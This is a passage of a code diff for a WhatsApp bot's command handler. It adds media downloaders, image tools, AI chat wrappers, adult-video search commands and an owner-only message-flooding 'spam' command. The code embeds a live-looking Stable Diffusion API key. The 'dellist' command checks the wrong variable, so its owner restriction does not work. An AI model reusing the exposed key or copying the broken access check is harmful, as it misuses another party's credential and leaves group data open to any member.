-if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
-if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
-if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
-if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
-if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
-if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
-if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
-if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
-if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
-if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
-if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
-if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
-let haldwhd = await ephoto(link, q)
-XeonBotInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
 }
 break
 case 'setcmd': {
@@ -6837,7 +7008,7 @@ ${translatedTafsirEnglish.text}`
     XeonBotInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
     }
     break
-    case 'tagadmin': case 'listadmin': case 'admin':{
+case 'tagadmin': case 'listadmin': case 'admin':{
     	if (!m.isGroup) return XeonStickGroup()
     const groupAdmins = participants.filter(p => p.admin)
     const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
@@ -6849,7 +7020,45 @@ ${listAdmin}
     XeonBotInc.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
 }
 break
-case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg' : case 'insta' : case 'ig' : {
+case 'addlist':
+if (!XeonTheCreator) return XeonStickOwner()
+if (!m.isGroup) return XeonStickGroup()
+var args1 = text.split("@")[0]
+var args2 = text.split("@")[1]
+if (!q.includes("@")) return replygcxeon(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
+if (isAlreadyResponList(from, args1, db_respon_list)) return replygcxeon(`List of responses with key : *${args1}* already in this group.`)
+if (/image/.test(mime)) {
+media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+mem = await TelegraPh(media)
+addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
+replygcxeon(`Successfully set list message with key : *${args1}*`)
+if (fs.existsSync(media)) fs.unlinkSync(media)
+} else {
+addResponList(from, args1, args2, false, '-', db_respon_list)
+replygcxeon(`Successful Add List With Key : *${args1}*`)
+}
+break
+case 'dellist':
+if (!XeonBotInc) return XeonStickOwner()
+if (!m.isGroup) return XeonStickGroup()
+if (db_respon_list.length === 0) return replygcxeon(`There is no message list in the database yet`)
+if (!q) return replygcxeon(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
+if (!isAlreadyResponList(from, q, db_respon_list)) return replygcxeon(`Item list by Name *${q}* not in the database!`)
+delResponList(from, q, db_respon_list)
+replygcxeon(`Successfully delete list message with key *${q}*`)
+break
+case 'store':
+case 'shop': 
+case 'list': {
+let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
+for (let x of db_respon_list) {
+teks += `│⭔ ${x.key}\n`
+}
+teks += `│\n└────────────⭓\n\n`
+replygcxeon(teks)
+}
+break
+case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
 	  if (!text) return replygcxeon(`You need to give the URL of Any Instagram video, post, reel, image`)
   let res
   try {
@@ -6863,11 +7072,9 @@ case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg' : c
   }
   const mediaArray = api_response.data;
   for (const mediaData of mediaArray) {
-    let sender = m.sender
     const mediaType = mediaData.type
     const mediaURL = mediaData.url_download
-    let cap = ` ${themeemoji} @${m.sender.split("@")[0]} HERE IS THE ${mediaType.toUpperCase()}`
-    mentionedJid:[sender]
+    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
     if (mediaType === 'video') {
       XeonBotInc.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
     } else if (mediaType === 'image') {
@@ -6876,51 +7083,116 @@ case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg' : c
   }
 }
 break
-case 'apk':
-case 'apkdl':{
-if (!text) return replygcxeon("What apk u wanna download?")
-let resxeon = await fetch(`https://vihangayt.me/download/apk?id=${text}`)
-let jsonxeon = await resxeon.json()
-XeonBotInc.sendMessage(from, { document: { url: jsonxeon.data.dllink}, fileName : jsonxeon.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
-.catch(console.error)
+case 'gimage':{
+if (!text) return replygcxeon(`Usage: ${prefix}gimage dgxeon github`);
+XeonBotInc.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
+let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
+try{
+for (let bing of ini.result) {
+await sleep(500)
+await XeonBotInc.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
+XeonBotInc.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
+}
+} catch (e) {
+XeonBotInc.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
+}
 }
 break
-case 'mathsai': {
-                if (!text) return replygcxeon('What is your question?')
-                let d = await fetchJson(`https://vihangayt.me/tools/mathssolve?q=${text}`)                
-                replygcxeon(d.data)
-           }
-            break
-            case 'blackboxai': {
-                if (!text) return replygcxeon('What is your question?')
-                let d = await fetchJson(`https://vihangayt.me/tools/blackboxv4?q=${text}`)                
-                replygcxeon(d.data)
-           }
-            break
-            case 'bardai': {
-                if (!text) return replygcxeon('What is your question?')
-                let d = await fetchJson(`https://vihangayt.me/tools/bard?q=${text}`)                
-                replygcxeon(d.data)
-           }
-            break
-            case 'photoleapai': {
-	if (!text) return replygcxeon('What is your question?')
-	let xeonfetch = await fetchJson(`https://vihangayt.me/tools/photoleap?q=${text}`)
-	XeonBotInc.sendMessage(from, { image: {url:xeonfetch.data}}, { quoted: m })
-	}
-	break
-	case 'lamaai': {
-                if (!text) return replygcxeon('What is your question?')
-                let d = await fetchJson(`https://vihangayt.me/tools/llama-2?q=${text}`)                
-                replygcxeon(d.data)
-           }
-            break
-            case 'geminiai': {
-                if (!text) return replygcxeon('What is your question?')
-                let d = await fetchJson(`https://vihangayt.me/tools/gemini?q=${text}`)                
-                replygcxeon(d.data)
-           }
-            break
+case 'removebg': case 'nobg':{
+if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
+if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
+let q = m.quoted ? m.quoted : m
+let media = await q.download()
+let url = await uploadImage(media)
+let anu = await fetch(`https://aemt.me/removebg?url=${url}`)
+let data = await anu.json()
+await XeonBotInc.sendMessage(m.chat, {image: {url: data.url.result}, caption: `Here u go!`}, {quoted: m})
+}
+break
+case'tozombie':{
+if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
+if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
+let q = m.quoted ? m.quoted : m
+let media = await q.download()
+let url = await uploadImage(media)
+let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
+let data = await anu.json()
+await XeonBotInc.sendMessage(m.chat, {image: {url: data.url}, caption: `Here u go!`}, {quoted: m})
+}
+break
+case 'capcut':{
+if (!text) return replygcxeon(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
+await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
+try{  
+let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
+XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: `Here u go!`}, {quoted: m})
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
+}catch (error) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
+}
+}
+break 
+case 'smeme': case 'stickermeme': case 'stickmeme': {
+
+if (!/webp/.test(mime) && /image/.test(mime)) {
+if (!text) return replygcxeon(`Usage: ${prefix + command} text1|text2`)
+let { TelegraPh } = require('./lib/uploader')
+
+atas = text.split('|')[0] ? text.split('|')[0] : '-'
+bawah = text.split('|')[1] ? text.split('|')[1] : '-'
+mee = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+
+mem = await TelegraPh(mee)
+
+meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
+
+memek = await XeonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
+
+
+} else {
+replygcxeon(`Send/reply image with caption ${prefix + command} text1|text2`)
+}
+}
+
+break
+
+case'smeta': {
+if (!/webp/.test(mime)) return replygcxeon('Reply sticker!')
+  var stiker = false
+    try {
+        let [packname, ...author] = q.split('|')
+            //var author = (author  []).join('|')
+                let mime = m.quoted.mimetype || ''
+                        //let img = await q.download()
+                            let img = await XeonBotInc.downloadAndSaveMediaMessage(quoted, makeid(5))
+                                if (!img) return replygcxeon('Reply a sticker!')
+                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
+                                      } catch (e) {
+                                          console.error(e)
+                                              if (Buffer.isBuffer(e)) stiker = e
+                                                } finally {
+                                                    if (stiker) XeonBotInc.sendMessage(m.chat, {
+                                                          sticker: stiker
+                                                              }, {
+                                                                    quoted: m
+                                                                        })
+                                                                            else return replygcxeon('reply sticker')
+                                                                              }
+                                                                              }       
+                                                                              break
+case 'instagram2': case 'ig2':{
+if (!text) return replygcxeon(`Enter the link!!!`)
+if (!isUrl(args[0])) return replygcxeon(`Where is the link?`)
+await XeonBotInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
+try{   
+let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
+XeonBotInc.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `Here you go!` }, { quoted: m })
+await XeonBotInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
+}catch (error) {
+await XeonBotInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
+}
+}
+break
 case 'itunes': {
 if (!text) return replygcxeon('Please provide a song name')
   try {
@@ -6948,128 +7220,432 @@ if (!text) return replygcxeon('Please provide a song name')
     }
   } catch (error) {
     console.error(error)
+  }
+}
+break
+case 'spam':
+				if (!XeonTheCreator) return XeonStickOwner()
+					if (!text) return replygcxeon(`Use ${prefix +command} text|amount`)
+				xeonarg = text.split("|")
+				if (!xeonarg) return replygcxeon(`Use ${prefix+ command} text|amount`)
+				if (Number(xeonarg[1]) >= 50) return replygcxeon('Max 50!')
+				if (isNaN(xeonarg[1])) return replygcxeon(`must be a number`)
+				for (let i = 0; i < xeonarg[1]; i++){
+					XeonBotInc.sendMessage(from, {text: xeonarg[0]})
+				}
+				break
+case 'simisimi': case 'simi':
+if (!text) replygcxeon('What do u want to ask?')
+let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
+const simi2 = simi.result
+XeonBotInc.sendMessage(m.chat, {text: simi2}, {quoted: m})
+break
+case 'clearall': {
+if (!XeonTheCreator) return XeonStickOwner()
+XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
+}
+break
+case 'pinchat': {
+if (!XeonTheCreator) return XeonStickOwner()
+if (m.isGroup) return XeonStickPrivate()
+XeonBotInc.chatModify({ pin: true }, m.chat)
+}
+break
+case 'unpinchat': {
+if (!XeonTheCreator) return XeonStickOwner()
+if (m.isGroup) return XeonStickPrivate()
+XeonBotInc.chatModify({ pin: false }, m.chat)
+}
+break
+case 'database': {
+if (!XeonTheCreator) return XeonStickOwner()
+totalreg = Object.keys(global.db.data.users).length
+    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
+    replygcxeon(`*${totalreg} users using Bot*`)
+}
+break 
+case 'getjoinrequest':{
+	if (!m.isGroup) return XeonStickGroup()
+	if (!isBotAdmins) return XeonStickBotAdmin()
+if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+	const response = await XeonBotInc.groupRequestParticipantsList(m.chat);
+  if (!response || !response.length) {
+    XeonBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
+    return;
+  }
+  let replyMessage = `${themeemoji} Join Request List:\n`;
+  response.forEach((request, index) => {
+    const { jid, request_method, request_time } = request;
+    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
+    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
+    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
+    replyMessage += `\n🧪 *Method:* ${request_method}`;
+    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
+  });
+
+  XeonBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
+};
+break
+case 'twitter': case 'twitterdl': case 'twitterdl': {
+	if (!args[0]) return replygcxeon(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
+	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygcxeon('Link Invalid!')
+          try {
+          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
+          let te = ` 
+┌─⊷ *TWITTER DL*
+▢ Description: ${desc}
+└───────────`
+XeonBotInc.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
+} catch (e) {
+  	replygcxeon(`Verify that the link is from Twitter`)
+	}
+}
+break
+case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
+	if (!m.isGroup) return XeonStickGroup()
+	if (!AntiNsfw) return replygcxeon(mess.nsfw)
+  if (!text) return replygcxeon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
+    if (!text) return replygcxeon('Please provide a search query or a valid Xvideos URL.');
+    // Check if the input is a valid Xvideos URL
+    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
+   try {
+      if (isURL) {
+        // If it's a valid URL, directly download the video
+        const result = await xvideosdl(text);
+        const { title, url } = result.result; 
+        // Send the video file
+        const response = await fetch(url);
+        const buffer = await response.arrayBuffer();
+        XeonBotInc.sendMessage(
+          m.chat,
+          {video: Buffer.from(buffer),
+          caption: `Here you go!!\nTitle: ${title}`} ); 
+      } else {
+        // If it's not a valid URL, perform a search and display the search results
+        const results = await xvideosSearch(text);
+        if (results.length === 0) {
+          replygcxeon('No search results found for the given query.');
+        } else {
+          const searchResults = results.map((result, index) => {
+            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
+          }).join('\n\n');  
+          replygcxeon(`*Search Results for "${text}":*\n\n${searchResults}`);
+        }
+      }
+    } catch (error) {
+      console.error(error);
+      return replygcxeon('Failed to fetch Xvideos video details.');
+    }
+  };
+  break
+  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
+  if (!m.isGroup) return XeonStickGroup()
+	if (!AntiNsfw) return replygcxeon(mess.nsfw)
+  if (!text)
+    return replygcxeon(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
+  let url
+  try {
+    url = new URL(text)
+  } catch (error) {
+    url = null
+  }
+  if (url) {
+    try {
+      const files = await xnxxdl(url.href)
+      if (files && files.high) {
+        XeonBotInc.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
+      } else {
+        replygcxeon('🔴 Error: Failed to retrieve the download URL.')
+      }
+    } catch (e) {
+      console.error(e)
+      replygcxeon('🔴 Error: We encountered a problem while processing the request.')
+    }
+  } else {
+    try {
+      const results = await xnxxSearch(text)
+      if (results.length > 0) {
+        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
+        replygcxeon(message, null, {
+          contextInfo: {
+            mentionJid: XeonBotInc.parseMention(message),
+          },
+        })
+      } else {
+        replygcxeon('🔴 Error: No search results found.')
+      }
+    } catch (e) {
+      console.error(e)
+      replygcxeon('🔴 Error: We encountered a problem while processing the request.')
+    }
+  }
+}
+break
+case 'gita-verse': case 'gita': case 'bhagavatgita': {
+	try {
+    // Extract the verse number from the command text.
+    let verseNumber = m.text.split(' ')[1]
+    if (!verseNumber || isNaN(verseNumber)) {
+      verseNumber = Math.floor(Math.random() * 700) + 1
+    }
+    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
+    if (!res.ok) {
+      let error = await res.json()
+      throw new Error(
+        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
+      )
+    }
+    let json = await res.json()
+    console.log('JSON response:', json)
+    let gitaVerse = `
+🕉 *Bhagavad Gita: Sacred Teachings*\n
+📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
+Verse ${json.verse_no}:\n
+" ${json.verse} "\n
+*🔮 Translation:*\n
+${json.translation}\n
+*🧘‍♂️ Spiritual Insight (Purport):*\n
+${json.purport}`
+    replygcxeon(gitaVerse)
+    if (json.audio_link) {
+      XeonBotInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
+    }
+  } catch (error) {
+    console.error(error)
     // Handle the error appropriately
   }
 }
 break
-case 'ttp':
-if (args.length == 0) return reply(`Example: ${prefix + command} dgxeon`)
-dgxeontks = args.join(" ")
-dgxeonvuff = await getBuffer(`https://vihangayt.me/maker/text2img?q=${dgxeontks}`)
-XeonBotInc.sendImageAsSticker(m.chat, dgxeonvuff, m, {
-                        packname: packname,
-                        author: author
-                    })
+case 'apk': {
+	try {
+    if (command === 'apk') {
+      if (!text) return replygcxeon(`*[❗] Please provide the APK Name you want to download.*`);
+      let data = await download(text);
+      if (data.size.replace(' MB', '') > 200) {
+        return await XeonBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
+      }
+      if (data.size.includes('GB')) {
+        return await XeonBotInc.sendMessage(m.chat, { text: '*[⛔] The file is too large.*' }, { quoted: m });
+      }
+      await XeonBotInc.sendMessage(
+        m.chat,
+        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
+        { quoted: m }
+      )
+    }
+  } catch {
+    return replygcxeon(`*[❗] An error occurred. Make sure to provide a valid link.*`);
+  }
+};
 break
-case 'attp':
-if (args.length == 0) return reply(`Example: ${prefix + command} dgxeon`)
-dgxeontks2 = args.join(" ")
-dgxeonvuff2 = await getBuffer(`https://vihangayt.me/maker/text2gif?q=${dgxeontks2}`)
-XeonBotInc.sendImageAsSticker(m.chat, dgxeonvuff2, m, {
-                        packname: packname,
-                        author: author
-                    })
+case 'mega':{
+	try {
+if (!text) return replygcxeon(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
+const { File } = require('megajs');
+        const file = File.fromURL(text);
+        await file.loadAttributes();
+        if (file.size >= 300000000) return replygcxeon('Error: File size is too large (Maximum Size: 300MB)');
+        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
+        replygcxeon(downloadingMessage);
+        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
+        const data = await file.downloadBuffer();
+        const fileExtension = path.extname(file.name).toLowerCase();
+        const mimeTypes = {
+            ".mp4": "video/mp4",
+            ".pdf": "application/pdf",
+            ".zip": "application/zip",
+            ".rar": "application/x-rar-compressed",
+            ".7z": "application/x-7z-compressed",
+            ".jpg": "image/jpeg",
+            ".jpeg": "image/jpeg",
+            ".png": "image/png",
+        };
+        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
+        await XeonBotInc.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
+    } catch (error) {
+        return replygcxeon(`Error: ${error.message}`);
+    }
+}
 break
-case 'blur':
-  case 'blurimg': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/blur?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'beautiful':
-  case 'beautifulimg': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/beautiful?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'facepalm':
-  case 'facepalmimage': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/facepalm?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'invert':
-  case 'invertimage': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/invert?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'pixelate':
-  case 'pixelateimage': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/pixelate?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'rainbow':
-  case 'rainbowimage': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/rainbow?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'trigger':
-  case 'triggerimage': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/trigger?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'wanted':
-  case 'wantedimage': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/wanted?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'wasted':
-  case 'wastedimage': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/wasted?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'carbon':
-  case 'carbonimage': {
- if (!text) return replygcxeon('Where is the text?')
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/maker/carbonimg?q=${text}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'colorize': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/tools/colorize?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'enhance': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/tools/enhance?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-            case 'dehaze': {
- if (!isMedia) return replygcxeon("Where Is The Image")
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-                let anu = await TelegraPh(media)
-                XeonBotInc.sendMessage(m.chat, {
-                    image: { url: `https://vihangayt.me/tools/dehaze?url=${anu}` },caption: "Here you go!" }, { quoted: m}) }
-            break
-           
+case 'diffusiob':{
+if (!text) return replygcxeon('What do u want to make?')
+    let myHeaders = new Headers();
+    myHeaders.append("Content-Type", "application/json");
+    let raw = JSON.stringify({
+        "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
+        "prompt": text,
+        "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
+        "width": "720",
+        "height": "720",
+        "samples": "1",
+        "num_inference_steps": "20",
+        "seed": null,
+        "guidance_scale": 7.5,
+        "safety_checker": "yes",
+        "multi_lingual": "no",
+        "panorama": "no",
+        "self_attention": "no",
+        "upscale": "no",
+        "embeddings_model": null,
+        "webhook": null,
+        "track_id": null
+    });
+    var requestOptions = {
+        method: 'POST',
+        headers: myHeaders,
+        body: raw,
+        redirect: 'follow'
+    };
+    try {
+        let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
+        let result = await response.json();
+        XeonBotInc.sendMessage(m.chat, { image: { url: result.output[0] }, caption: result.meta.prompt }, { quoted: m });
+    } catch (error) {
+        console.log('error', error);
+        XeonBotInc.sendMessage(m.chat, { image: { url: `${error.config.url}` }, caption: text }, { quoted: m });
+    }
+}
+break
+case 'indo-ai': {
+	if (!text) return replygcxeon(`*• Example:* ${usedPrefix + command} halo`)
+try {
+let gpt = await (await fetch(`https://itzpire.site/ai/gpt-web?q=${text}`)).json()
+replygcxeon("*[ Indo-Ai ]* " + '\n' + gpt.result)
+ } catch(e) {
+ return replygcxeon("`*Error*`")
+}
+}
+break
+case 'photoleap': {
+	if (!text) return replygcxeon(`*• Example:* ${usedPrefix + command} blue sea`);
+  let currentTime = Date.now();
+  let lastUsed = 0;
+  if (currentTime - lastUsed < 10000) return replygcxeon("Cooldown 10 seconds, try again later");
+  lastUsed = currentTime;
+  try {
+    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
+    XeonBotInc.sendMessage(m.chat, {image: { url: gpt.result_url}, caption: text}, {quoted: m});
+  } catch(e) {
+    return replygcxeon("`*Error*`");
+  }
+}
+break
+case 'ai':
+case 'openai': {
+	if (!text) return replygcxeon(`*• Example:* ${prefix + command} what is your name`);   
+        let name = XeonBotInc.getName(m.sender);
+        try {
+            const response = await axios.post("https://deepenglish.com/wp-json/ai-chatbot/v1/chat", {
+                messages: [
+                    { role: "system", content: `${name}` },
+                    { role: "user", content: text }
+                ]
+            });
+            const hasil = response.data;   
+            replygcxeon(hasil.answer);
+        } catch (error) {
+            console.error("Error fetching data:", error);
+            return replygcxeon(error);
+        }
+    }
+    break
+case 'wikipedia': case 'wiki': {
+	if (!text) return replygcxeon(` Enter what you want to search for on Wikipedia`)
+	
+    try {
+	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
+	const $ = cheerio.load(link.data)
+	let wik = $('#firstHeading').text().trim()
+	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
+	replygcxeon(`▢ *Wikipedia*
+
+‣ Title : ${wik}
+
+${resulw}`)
+} catch (e) {
+  replygcxeon('⚠️ No results found ')
+}
+}
+break
+case 'traceanime': {
+	try {
+    let q = m.quoted ? m.quoted : m;
+    let mime = (q.msg || q).mimetype || q.mediaType || "";
+    if (!mime.startsWith('image')) {
+      return replygcxeon("*Respond to an image*");
+    }
+    let data = await q.download();
+    let image = await uploadImage(data);
+    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
+    console.log("API URL:", apiUrl);
+    let response = await fetch(apiUrl);
+    let result = await response.json();
+    console.log("API Response:", result);
+    if (!result || result.error || result.result.length === 0) {
+      return replygcxeon("*Error: Could not track the anime.*");
+    }
+    let { anilist, from, to, similarity, video, episode } = result.result[0];
+    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
+    let message = `*Anime:* ${animeTitle}\n`;
+    if (anilist.synonyms && anilist.synonyms.length > 0) {
+      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
+    }
+    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
+    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
+    if (episode) {
+      message += `*Episode:* ${episode}\n`;
+    }
+    console.log("Anime Information:", {
+      animeTitle,
+      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
+      similarity,
